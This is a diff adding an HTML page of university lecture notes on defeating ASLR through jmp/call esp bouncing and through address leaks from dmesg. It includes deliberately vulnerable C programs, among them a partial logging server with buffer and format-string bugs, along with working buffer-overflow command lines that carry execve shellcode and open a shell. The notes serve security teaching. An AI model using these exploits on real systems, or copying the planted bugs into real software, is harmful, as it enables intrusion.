@@ -1,0 +1,889 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-10-23 Fri 13:47 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 17: Defeating ASLR by Bouncing and Basing</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 17: Defeating ASLR by Bouncing and Basing</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline1">1. Bouncing to Defeat ASLR</a></li>
+<li><a href="#orgheadline4">2. Call/Jmp esp bounce</a>
+<ul>
+<li><a href="#orgheadline2">2.1. Finding a bounce point</a></li>
+<li><a href="#orgheadline3">2.2. Bouncing off Linux Gate (Linux 2.6.X)</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline8">3. Basing from dmesg</a>
+<ul>
+<li><a href="#orgheadline5">3.1. dmesg</a></li>
+<li><a href="#orgheadline6">3.2. On fork() and memory space</a></li>
+<li><a href="#orgheadline7">3.3. Basing a logging engine</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-2">
+<h2 id="orgheadline1"><span class="section-number-2">1</span> Bouncing to Defeat ASLR</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+One thing we learned by brute forcing ASLR is that randomness may not
+be as random as we want it to be. However, things get worse when
+something is completely un-random. It doesn't help that the stack is
+random if some other part of the code is not random. If that
+non-random region happened to hold some instruction that would be
+useful, and it was always in that same spot, then we could use it as
+part of our exploit.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-2">
+<h2 id="orgheadline4"><span class="section-number-2">2</span> Call/Jmp esp bounce</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+What are we looking for exactly? Well there are two instructions that
+are particularly useful: <code>jmp esp</code> and <code>call esp</code>. These two
+instructions are super useful due to what happens right before the
+return address. Consider the <code>leave</code> and <code>ret</code> commands, which are
+equivalent to the following:
+</p>
+
+<pre class="example">
+leave --&gt; mov esp,ebp
+          pop ebp
+
+ret   --&gt; pop eip
+</pre>
+
+<p>
+The leave command will deallocate the stack frame and reset <code>ebp</code> to
+the saved base pointer. Return will then pop the return address off
+the stack and set it to the instruction pointer. The question, what
+does the stack look like when that procedure finishes, and what is esp
+referencing. If we look at situation where we are using an exploit like so:
+</p>
+
+<pre class="example">
+                                          .-----------.
+                                          |           |
+                                          |           v
+./vulnerable 5 &lt;--------padding-----&gt;&lt;return-address&gt;&lt;shell code&gt;
+</pre>
+
+<p>
+Our stack would like this as we moved through the procedures
+</p>
+
+<pre class="example">
+                leave-&gt;mov esp,ebp       ret-&gt;pop eip
+                       pop ebp
+
+                       ebp-&gt;|   ???   |  ebp-&gt;|   ???   |
+      .---------.           |---------|       |---------|
+      | s  c    |           | s  c    |       | s  c    |
+      |  h  o   |           |  h  o   |       |  h  o   |
+      |   e  d  |           |   e  d  |       |   e  d  |
+      |    l  e |           |    l  e |       |    l  e |
+      |     l   |           |     l   | esp-&gt; |     l   |
+      |---------|           |---------|       '---------'
+      | ret. ad.|      esp-&gt;| ret. ad.|
+      |---------|           '---------'   
+ebp-&gt; |   sbp   |  
+      |---------|
+      |         |     
+      :         :
+      .         . 
+esp-&gt; |         |
+      '---------'
+</pre>
+
+<p>
+And looky there, <code>esp</code> is pointing right at our shell code. So, if
+knew the location of a <code>jmp esp</code> or <code>call esp</code> instruction, then we
+can write that address as the return address and that would then
+execute our shell code. This is called <i>bouncing</i>.
+</p>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-3">
+<h3 id="orgheadline2"><span class="section-number-3">2.1</span> Finding a bounce point</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+To start, we need to what bytes constitute a <code>jmp esp</code> or a <code>call esp</code>. 
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel jmpcall_esp
+
+jmpcall_esp:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060:	ff e4                	jmp    esp
+ 8048062:	ff d4                	call   esp
+</pre>
+<p>
+So, in our code, we are looking for <code>\xff\xe4</code> or <code>\xff\d4</code>. To see
+how this works, I've modified the vulnerable program we've been
+working with as follows:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">jmpesp_embedding</span>(){
+  <span style="color: #00ffff;">asm</span>(<span style="color: #ffa07a;">"jmp *%esp"</span>);<span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">add a jmp esp instruction here to find</span>
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(){
+  printf(<span style="color: #ffa07a;">"You've been naughty!\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">good</span>(){
+  printf(<span style="color: #ffa07a;">"Go Navy!\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">n</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">str</span>){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">i</span> = 0;  
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[32];
+
+
+  strcpy(buf,str);
+
+  <span style="color: #00ffff;">while</span>( i &lt; n ){
+    printf(<span style="color: #ffa07a;">"%d %s\n"</span>,i++, buf);
+  }
+
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  vuln(atoi(argv[1]), argv[2]);
+
+  <span style="color: #00ffff;">return</span> 0;
+
+}
+</pre>
+</div>
+
+<p>
+The function <code>jmpesp_embedding</code> uses C's inline assembly embedding,
+the <code>asm()</code> function to put a <code>jmp esp</code> instruction into the C code at
+a consistent place. In particular, it will be in the <code>text</code> segment,
+which is not randomized. The reason is somewhat obvious when you think
+about it, there are a lot of hard jmps and control flow that requires
+knowing the addresses of other functions. This stuff can't be changed
+willy nilly, so it can't be randomized like the stack, where
+everything is relative to the stack and base pointers.
+</p>
+
+<p>
+To learn the address of our bounce point, we can look at <code>objdump</code>.
+</p>
+<pre class="example">
+080484ad &lt;jmpesp_embedding&gt;:
+ 80484ad:	55                   	push   ebp
+ 80484ae:	89 e5                	mov    ebp,esp
+ 80484b0:	ff e4                	jmp    esp
+ 80484b2:	5d                   	pop    ebp
+ 80484b3:	c3                   	ret
+</pre>
+<p>
+At address 0x08048b0, we have a <code>jmp esp</code>, and now to use that as our
+overwrite for the return address. Below, I use the smallest shell code
+(21-byte) code as before:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xb0\x84\x04\x08' + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+$ cat /proc/sys/kernel/randomize_va_space
+2
+$
+</pre>
+<p>
+And, on the first try, BAM!, and look, no NOP sled.  As you can see,
+this is with address space randomization. This just got easy &#x2026; sort of.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">2.2</span> Bouncing off Linux Gate (Linux 2.6.X)</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+People have known about this vulnerability for awhile, so they try
+hard get rid of bounce points, but that was not always the case. Let's
+take a trip down memory lane to 2006 when the Linux 2.6.X kernel was
+kind. Ubuntu 6.06 was released (so called Dapper Drake), and for
+reference, we are now up to 14.04.
+</p>
+
+<p>
+In the Linux 2.6.X kernels, there was a problem with address space
+randomization and the loading of some shared libraries. The problem,
+there map locations was not random. We can investigate this more by
+taking a trip down memory lane &#x2026; I've got a Ubuntu 6.06 VM running.
+</p>
+
+<p>
+We can run the same tests to check out the randomness as we did in the last lesson:
+</p>
+<pre class="example">
+user@ubuntu-6-06:~/si485h-class-demos/class/16$ uname -a
+Linux ubuntu-6-06 2.6.15-26-386 #1 PREEMPT Thu Aug 3 02:52:00 UTC 2006 i686 GNU/Linux
+
+user@ubuntu-6-06:~/si485h-class-demos/class/16$ for i in `seq 1 1 100`; do ./rand_sample ; done | python random_bits.py 
+Consitent:  10111111100000000000000000000100 0xBF800004L
+  Changed:  11111111100000000000000000001111 19
+</pre>
+<p>
+And we do see that the yes, in fact there is randomization going on,
+but it is not quite as it seems. Let's look what happens when we look at the maps:
+</p>
+<pre class="example">
+user@ubuntu-6-06:~/si485h-class-demos/class/16$ ./busy_wait &amp;
+[2] 10252
+user@ubuntu-6-06:~/si485h-class-demos/class/16$ cat /proc/10252/maps 
+08048000-08049000 r-xp 00000000 08:01 614242     /home/user/si485h-class-demos/class/16/busy_wait
+08049000-0804a000 rwxp 00000000 08:01 614242     /home/user/si485h-class-demos/class/16/busy_wait
+b7e36000-b7e37000 rwxp b7e36000 00:00 0 
+b7e37000-b7f5c000 r-xp 00000000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
+b7f5c000-b7f61000 r-xp 00125000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
+b7f61000-b7f64000 rwxp 0012a000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
+b7f64000-b7f66000 rwxp b7f64000 00:00 0 
+b7f70000-b7f72000 rwxp b7f70000 00:00 0 
+b7f72000-b7f87000 r-xp 00000000 08:01 566182     /lib/ld-2.3.6.so
+b7f87000-b7f89000 rwxp 00014000 08:01 566182     /lib/ld-2.3.6.so
+bfd71000-bfd87000 rwxp bfd71000 00:00 0          [stack]
+ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]
+user@ubuntu-6-06:~/si485h-class-demos/class/16$ killall busy_wait
+user@ubuntu-6-06:~/si485h-class-demos/class/16$ ./busy_wait &amp;
+[3] 10276
+[2]   Terminated              ./busy_wait
+user@ubuntu-6-06:~/si485h-class-demos/class/16$ cat /proc/10276/maps 
+08048000-08049000 r-xp 00000000 08:01 614242     /home/user/si485h-class-demos/class/16/busy_wait
+08049000-0804a000 rwxp 00000000 08:01 614242     /home/user/si485h-class-demos/class/16/busy_wait
+b7e3e000-b7e3f000 rwxp b7e3e000 00:00 0 
+b7e3f000-b7f64000 r-xp 00000000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
+b7f64000-b7f69000 r-xp 00125000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
+b7f69000-b7f6c000 rwxp 0012a000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
+b7f6c000-b7f6e000 rwxp b7f6c000 00:00 0 
+b7f78000-b7f7a000 rwxp b7f78000 00:00 0 
+b7f7a000-b7f8f000 r-xp 00000000 08:01 566182     /lib/ld-2.3.6.so
+b7f8f000-b7f91000 rwxp 00014000 08:01 566182     /lib/ld-2.3.6.so
+bfc79000-bfc8f000 rwxp bfc79000 00:00 0          [stack]
+ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]
+</pre>
+<p>
+You'll notice that some thigns move around, but the <code>[vdso]</code> does
+not. What is that? Well that is the linux kernel entry points for
+system calls, the so called linux kernel gateway. Using the <code>ldd</code>
+tool, we can see this more so:
+</p>
+<pre class="example">
+user@ubuntu-6-06:~/si485h-class-demos/class/16$ ldd busy_wait
+	linux-gate.so.1 =&gt;  (0xffffe000)
+	libc.so.6 =&gt; /lib/tls/i686/cmov/libc.so.6 (0xb7e20000)
+	/lib/ld-linux.so.2 (0xb7f5b000)
+</pre>
+<p>
+What's in this non-randomized location? Well, let's see if it at least
+has what we need, and we can search it using a very simple C program:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c" id="orgsrcblock1"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(){
+
+  <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">long</span> <span style="color: #eedd82;">linuxgate_start</span>=0xffffe000;
+  <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">ptr</span> = (<span style="color: #98fb98;">char</span> *) linuxgate_start;
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">i</span>;
+  <span style="color: #00ffff;">for</span>(i=0;i&lt;4096 <span style="color: #ff7f24;">/*</span><span style="color: #ff7f24;">one page</span><span style="color: #ff7f24;">*/</span>; i++){
+    <span style="color: #00ffff;">if</span> ( ptr[i] == <span style="color: #ffa07a;">'\xff'</span> &amp;&amp; ptr[i+1] == <span style="color: #ffa07a;">'\xe4'</span>){
+      printf(<span style="color: #ffa07a;">"Found jmp esp at %p\n"</span>, ptr+i);
+    }
+  }
+
+  <span style="color: #00ffff;">return</span> 0;
+}
+</pre>
+</div>
+<pre class="example">
+user@ubuntu-6-06:~/si485h-class-demos/class/17$ ./search_gate 
+Found jmp esp at 0xffffe777
+</pre>
+<p>
+So we can now use that address as our bounce point to exploit the
+vulnerable program. Here's that vulnerable program being exploited,
+agian.
+</p>
+<pre class="example">
+user@ubuntu-6-06:~/si485h-class-demos/class/17$ ./vulnerable 1 `python -c "print 'A'*(0x20+0x8) + '\x77\xe7\xff\xff' + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+user@ubuntu-6-06:/home/user/si485h-class-demos/class/17$ exit  #&lt;--- here I'm in the shell
+exit
+user@ubuntu-6-06:~/si485h-class-demos/class/17$
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline8" class="outline-2">
+<h2 id="orgheadline8"><span class="section-number-2">3</span> Basing from dmesg</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Another strategy for circumventing ASLR is called basing, where
+through some side channel, you learn the offset or the base address of
+the loaded page, which will reveal where to jump. This can be done
+remotely, or locally, and here we'll focus on using <code>dmesg</code> to reveal
+the base of the map and our jump point.
+</p>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-3">
+<h3 id="orgheadline5"><span class="section-number-3">3.1</span> dmesg</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+<code>dmesg</code> is the kernel logging functionality that is availble to the
+user. It reports things like network setup and tear down, and also
+information about segementation faults. Which we will use today.
+</p>
+
+<p>
+For example, let's consider segfaulting (on purpose) our vulnerable
+program:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable 1 `python -c "print 'A'*100"`
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[2876532.997490] vulnerable[23836]: segfault at 41414141 ip 41414141 sp bf973950 error 14
+</pre>
+
+<p>
+The program crashed, this was reported by the operating system and
+logged in <code>dmesg</code>. Looking more closely, the reason it crashed is
+that the instruction pointer has a bunch of A's overwritten it. 
+</p>
+
+<p>
+More importantly, we can see that the stack pointer is also
+revealed, and with the base address we need, 0xbf90000! 
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-3">
+<h3 id="orgheadline6"><span class="section-number-3">3.2</span> On fork() and memory space</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+Another item we can leverage is that <code>fork()</code>'ed process share the
+same memory space as there parent. For example, here is a sample program:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;unistd.h&gt;</span>
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">a</span> =10;
+
+  <span style="color: #00ffff;">if</span> ( fork() == 0){
+    <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">child</span>
+    printf(<span style="color: #ffa07a;">"Child: %p\n"</span>,&amp;a);
+  }<span style="color: #00ffff;">else</span>{
+    printf(<span style="color: #ffa07a;">"Parent: %p\n"</span>,&amp;a);
+  }
+  wait(<span style="color: #7fffd4;">NULL</span>);
+  <span style="color: #00ffff;">return</span>;  
+
+}
+</pre>
+</div>
+<pre class="example">
+user@si485H-base:demo$ ./fork_rand_sample 
+Parent: 0xbf9ced9c
+Child: 0xbf9ced9c
+</pre>
+
+<p>
+Why is this important? Well,many logging and backend systems must
+work asynchronously, so foreach request, they fork and have a child
+complete the tasks. If we can get the child to crash, there would be
+a log message in dmesg, but the parent would persist. That's exactly
+what we need to attack the parent process.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline7" class="outline-3">
+<h3 id="orgheadline7"><span class="section-number-3">3.3</span> Basing a logging engine</h3>
+<div class="outline-text-3" id="text-3-3">
+<p>
+Below is a sample logging utility that uses a socket to accept new
+messages:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;unistd.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;sys/socket.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;netinet/in.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;arpa/inet.h&gt;</span>
+
+<span style="color: #00ffff;">const</span> <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">logfile</span>[]=<span style="color: #ffa07a;">"log.dat"</span>;
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">handle_client</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">sock</span>);
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">hello</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">sock</span>);
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">logmsg</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">sock</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">msg</span>);
+<span style="color: #98fb98;">char</span> * <span style="color: #87cefa;">getmsg</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">sock</span>);
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">hello</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">sock</span>){
+  <span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span> <span style="color: #eedd82;">client_addr</span>; 
+  <span style="color: #98fb98;">socklen_t</span> <span style="color: #eedd82;">sin_size</span> ;
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">hello</span>[100];
+
+  getpeername(sock, (<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span> *) &amp;client_addr, &amp;sin_size);
+
+  sprintf(hello,<span style="color: #ffa07a;">"Hello %s: Send log message\n"</span>, inet_ntoa(client_addr.sin_addr));
+  printf(<span style="color: #ffa07a;">"%s"</span>,hello);
+
+  write(sock,hello,strlen(hello));
+
+}
+
+<span style="color: #98fb98;">char</span> * <span style="color: #87cefa;">getmsg</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">sock</span>){
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">size</span>=20;
+  <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">response</span> = malloc(size);
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[10];
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">n</span>=0,<span style="color: #eedd82;">i</span>=0;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">read a log msg reallocate as needed</span>
+  <span style="color: #00ffff;">while</span>( (n = read(sock,buf,10)) &gt; 0){
+    <span style="color: #00ffff;">if</span> (i+n &gt; size){
+   size*=2; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">double size</span>
+   response = realloc(response, size);
+    } 
+
+    strncpy(&amp;response[i],buf,n);<span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">write into response</span>
+    i+=n; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">move foreard the counter</span>
+  }
+
+  response[i]=<span style="color: #ffa07a;">'\0'</span> ; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">null terminate</span>
+
+  <span style="color: #00ffff;">return</span> response;
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">logmsg</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">sock</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">msg</span>){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">event</span>[50];
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">create event string</span>
+  sprintf(event,<span style="color: #ffa07a;">"[%d] %s\n"</span>, time(<span style="color: #7fffd4;">NULL</span>), msg);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">open the logfile</span>
+  <span style="color: #98fb98;">FILE</span> * <span style="color: #eedd82;">fstream</span> = fopen(logfile,<span style="color: #ffa07a;">"a"</span>);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">log the event</span>
+  fprintf(fstream,event);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">close the file</span>
+  fclose(fstream);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">write repsonse to client</span>
+  write(sock,event,strlen(event));
+
+  <span style="color: #00ffff;">return</span>;
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">handle_client</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">sock</span>){
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">do hello</span>
+  printf(<span style="color: #ffa07a;">"Handle Client!\n"</span>);
+  hello(sock);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">get msg</span>
+  <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">msg</span> = getmsg(sock);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">log response</span>
+  logmsg(sock,msg);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">deallocate</span>
+  free(msg);
+
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">goodbye</span>[]=<span style="color: #ffa07a;">"Goodbye!\n"</span>;
+  write(sock, goodbye,strlen(goodbye));
+  shutdown(sock,2);
+  close(sock);
+}
+
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">void</span>){
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">server</span>, <span style="color: #eedd82;">client</span>; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">server and client socket</span>
+
+  <span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span> <span style="color: #eedd82;">host_addr</span>; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">address structures</span>
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">yes</span>=1,<span style="color: #eedd82;">gonavy</span>=1;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">open new socket for server</span>
+  server = socket(AF_INET, SOCK_STREAM, 0);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set up server address</span>
+  memset(&amp;(host_addr), <span style="color: #ffa07a;">'\0'</span>, <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span>));
+  host_addr.sin_family=AF_INET;
+  host_addr.sin_port=htons(2525);
+  host_addr.sin_addr.s_addr=INADDR_ANY;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">bind server socket</span>
+  <span style="color: #00ffff;">if</span>(bind(server, (<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span> *) &amp;host_addr, <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span>)) &lt; 0){
+    perror(<span style="color: #ffa07a;">"bind"</span>);
